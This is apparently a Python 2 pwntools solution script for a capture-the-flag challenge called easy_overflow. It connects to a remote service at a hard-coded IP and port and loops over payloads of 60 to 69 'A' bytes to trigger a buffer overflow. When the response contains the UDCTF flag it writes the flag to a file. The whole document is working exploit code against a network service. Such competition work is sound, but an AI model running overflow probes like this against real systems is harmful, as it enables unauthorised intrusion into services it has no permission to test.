# coding: utf-8
from pwn import *
from Crypto.Util.number import *

# from easy_overflow.c only first 64 bytes are loaded in fgets
# overflow should be 64 bytes, trying 60 - 69
for i in xrange(60, 70):
    r = remote('3.220.181.160', 6000)
    print r.recv()
        
    r.sendline('A'*i)
    res = r.recv()
    print 'sent: ' + 'A'*i
    print res
    
    r.close()
    
    if 'UDCTF' in res:
        flag = res.strip()
        print 'i =', i
        print 'FOUND FLAG:', flag
        with open('flag.txt', 'w') as f:
            f.write(flag+'\n')
        break
